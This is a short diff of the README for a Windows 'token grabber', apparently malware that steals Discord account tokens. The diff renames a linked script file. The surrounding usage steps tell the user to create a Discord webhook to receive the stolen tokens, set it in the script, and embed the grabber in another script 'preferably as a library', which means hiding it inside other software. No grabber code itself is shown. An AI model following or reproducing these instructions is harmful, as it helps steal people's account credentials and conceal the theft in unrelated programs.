@@ -17,7 +17,7 @@ This version of the grabber only supports **Windows**.
 
 # How to use
  1. Create a webhook on your Discord server.
- 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
+ 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_grabber.py](token_grabber.py)
  2.5. add it to another script (preferably as a library)
  example:
  ```python
